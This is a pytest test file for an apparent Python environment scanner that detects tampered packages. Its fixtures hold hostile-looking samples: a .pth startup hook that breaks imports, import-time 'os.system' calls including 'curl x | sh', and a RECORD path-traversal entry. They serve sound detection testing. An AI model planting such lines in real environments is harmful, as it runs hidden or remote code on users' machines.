import base64
import hashlib
import json
from pathlib import Path

import pytest

from buckthorn.cli import main
from buckthorn.env import find_site_packages, scan_env

SHADOW = "import sys; sys.modules['collections'] = None\n"


def _hash(data: bytes) -> str:
    return "sha256=" + base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()


@pytest.fixture
def venv(tmp_path: Path):
    """A fake venv. install() writes a distribution's files and a RECORD that matches them."""
    site = tmp_path / "venv" / "lib" / "python3.13" / "site-packages"
    site.mkdir(parents=True)
    (tmp_path / "venv" / "pyvenv.cfg").write_text("home = /usr/bin\n")

    def install(name, version, files, editable=False, tag="py3-none-any"):
        dist_info = f"{name}-{version}.dist-info"
        files = {k: v.encode() if isinstance(v, str) else v for k, v in files.items()}
        files[f"{dist_info}/METADATA"] = f"Name: {name}\nVersion: {version}\n".encode()
        files[f"{dist_info}/WHEEL"] = f"Wheel-Version: 1.0\nTag: {tag}\n".encode()
        if editable:
            files[f"{dist_info}/direct_url.json"] = json.dumps(
                {"url": "file:///src", "dir_info": {"editable": True}}
            ).encode()
        rows = [f"{rel},{_hash(data)},{len(data)}" for rel, data in files.items()]
        rows.append(f"{dist_info}/RECORD,,")
        files[f"{dist_info}/RECORD"] = ("\n".join(rows) + "\n").encode()
        for rel, data in files.items():
            target = site / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(data)

    install.site = site
    install.root = tmp_path / "venv"
    return install


def _by_path(results):
    return {r.path: r for r in results}


def test_finds_site_packages_from_a_venv_or_directly(venv):
    assert find_site_packages(venv.root) == [venv.site]
    venv("pkg", "1.0", {"pkg/__init__.py": ""})
    assert find_site_packages(venv.site) == [venv.site]


def test_not_an_environment_is_an_error(tmp_path):
    with pytest.raises(ValueError):
        find_site_packages(tmp_path)


def test_clean_environment(venv):
    venv("pkg", "1.0", {"pkg/__init__.py": "x = 1\n"})
    (result,) = scan_env(venv.root)
    assert result.path == "pkg==1.0"
    assert result.verdict == "clean"


def test_installed_pth_with_a_hook_is_flagged(venv):
    venv("evil", "1.0", {"evil.pth": SHADOW, "evil/__init__.py": ""})
    (result,) = scan_env(venv.root)
    assert [f.rule_id for f in result.findings] == ["BKT-PTH-002"]


def test_file_changed_after_install_is_flagged(venv):
    venv("pkg", "1.0", {"pkg/__init__.py": "x = 1\n"})
    (venv.site / "pkg" / "__init__.py").write_text("x = 2\n")
    (result,) = scan_env(venv.root)
    assert [f.rule_id for f in result.findings] == ["BKT-REC-001"]


def test_import_time_code_in_an_installed_module(venv):
    venv("pkg", "1.0", {"pkg/__init__.py": "import os\nos.system('id')\n"})
    (result,) = scan_env(venv.root)
    assert [f.rule_id for f in result.findings] == ["BKT-IMPORT-002"]


def test_unowned_pth_dropped_into_site_packages(venv):
    venv("pkg", "1.0", {"pkg/__init__.py": ""})
    (venv.site / "dropped.pth").write_text(SHADOW)
    results = _by_path(scan_env(venv.root))
    unowned = results["site-packages (not owned by any package)"]
    assert sorted(f.rule_id for f in unowned.findings) == ["BKT-ENV-001", "BKT-PTH-002"]
    assert unowned.verdict == "flagged"


def test_unowned_sitecustomize(venv):
    (venv.site / "sitecustomize.py").write_text("x = 1\n")
    (result,) = scan_env(venv.root)
    assert sorted(f.rule_id for f in result.findings) == ["BKT-ENV-001", "BKT-START-001"]


def test_virtualenv_seed_files_are_expected(venv):
    (venv.site / "_virtualenv.pth").write_text("import _virtualenv")
    (venv.site / "_virtualenv.py").write_text("import sys\nsys.meta_path.insert(0, object())\n")
    assert scan_env(venv.root) == []


def test_virtualenv_seed_files_are_still_read(venv):
    (venv.site / "_virtualenv.pth").write_text("import _virtualenv")
    (venv.site / "_virtualenv.py").write_text("import os\nos.system('curl x | sh')\n")
    (result,) = scan_env(venv.root)
    assert "BKT-IMPORT-001" in {f.rule_id for f in result.findings}


def test_a_changed_virtualenv_pth_is_not_trusted(venv):
    (venv.site / "_virtualenv.pth").write_text("import _virtualenv; import evil")
    (result,) = scan_env(venv.root)
    assert "BKT-PTH-001" in {f.rule_id for f in result.findings}


def test_editable_installs_are_noted_not_scanned(venv):
    venv(
        "mine",
        "0.1",
        {"__editable__.mine-0.1.pth": "import __editable___mine_finder\n"},
        editable=True,
    )
    (result,) = scan_env(venv.root)
    assert [f.rule_id for f in result.findings] == ["BKT-ENV-002"]
    assert result.verdict == "clean"


def test_record_entry_that_escapes_the_environment_is_not_read(venv, tmp_path):
    outside = tmp_path / "secret.txt"
    outside.write_text("do not read")
    venv("pkg", "1.0", {"pkg/__init__.py": ""})
    record = venv.site / "pkg-1.0.dist-info" / "RECORD"
    record.write_text(record.read_text() + "../../../../secret.txt,sha256=x,1\n")
    (result,) = scan_env(venv.root)
    assert result.verdict == "clean"


def test_symlink_out_of_site_packages_is_not_followed(venv, tmp_path):
    outside = tmp_path / "elsewhere.py"
    outside.write_text("import os\nos.system('id')\n")
    venv("pkg", "1.0", {"pkg/__init__.py": ""})
    (venv.site / "pkg" / "__init__.py").unlink()
    (venv.site / "pkg" / "__init__.py").symlink_to(outside)
    (result,) = scan_env(venv.root)
    assert [f.rule_id for f in result.findings] == ["BKT-SKIP-004"]


def test_distribution_without_record_is_not_verified(venv):
    venv("pkg", "1.0", {"pkg/__init__.py": ""})
    (venv.site / "pkg-1.0.dist-info" / "RECORD").unlink()
    results = _by_path(scan_env(venv.root))
    assert results["pkg==1.0"].verdict == "not_verified"


def test_large_native_library_is_hashed_not_capped(venv, monkeypatch):
    from buckthorn import scan

    monkeypatch.setattr(scan, "MAX_MEMBER_BYTES", 1000)  # above RECORD's size, below the library's
    big = b"\x7fELF\x02\x01\x01" + b"\x00" * 5000
    venv("pkg", "1.0", {"pkg/_c.so": big}, tag="cp313-cp313-linux_x86_64")
    (result,) = scan_env(venv.root)
    assert result.verdict == "clean"


def test_env_command(venv, capsys):
    venv("evil", "1.0", {"evil.pth": SHADOW})
    assert main(["env", str(venv.root)]) == 1
    assert "evil==1.0: flagged" in capsys.readouterr().out


def test_env_command_on_a_folder_that_is_not_an_environment(tmp_path):
    assert main(["env", str(tmp_path)]) == 2
